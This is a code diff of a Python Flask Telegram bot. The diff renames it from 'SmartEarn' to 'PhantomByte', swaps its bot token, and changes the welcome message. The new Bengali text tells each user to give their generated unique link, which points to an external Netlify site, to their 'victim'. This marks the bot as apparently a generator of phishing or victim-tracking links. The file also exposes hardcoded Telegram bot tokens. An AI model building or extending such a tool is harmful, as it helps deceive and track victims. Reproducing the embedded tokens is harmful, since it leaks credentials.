@@ -1,3 +1,4 @@
+
 # =======================================
 # SmartEarn Multi-User Bot System with Enhanced UI
 # Developer: MN SIDDIK
@@ -17,7 +18,7 @@ CORS(app)
 # =========================
 # Config
 # =========================
-USER_BOT_TOKEN = "8572616463:AAH1sQJsSlYOhj657naFUpKvlNquwtjzrLI"
+USER_BOT_TOKEN = "8457917045:AAHS3L8cch9kfyRa6T_cVZ_29sSci90b5n8"
 ADMIN_BOT_TOKEN = "8292480092:AAGlR5uZmj92shdUrtOEZyacezuQvYB1IPA"
 BASE_URL = "https://smart-earning.netlify.app"
 
@@ -84,11 +85,11 @@ def handle_user_bot():
             
             # Build a professional welcome message
             welcome_text = (
-                f"🎉 *Welcome to SmartEarn!* \n\n"
-                f"Hi — I am *SmartEarn Bot* (developer: *{DEVELOPER_NAME}*).\n\n"
+                f"🎉 *Welcome to PhantomByte!* \n\n"
+                f"Hi — I am *PhantomByte Bot* (developer: *{DEVELOPER_NAME}*).\n\n"
                 f"🔗 Your unique link: `{BASE_URL}/?uid={unique_id}`\n\n"
-                f"👉 Use this link to continue. This link is *private* — please don't share it.\n\n"
-                f"🛠️ If you need help or want updates, contact the developer or join the channel below."
+                f"👆এই লিংকটা আপনি আপনার Victem কে দিবেন !!\n\n"
+                f"🛠️ আর এখনো যারা আমাদের Channel এ জয়েন হন নাই বিভিন্ন আপডেট পেতে জয়েন করুন ✅"
             )
 
             # Send welcome with inline buttons (Contact & Channel)
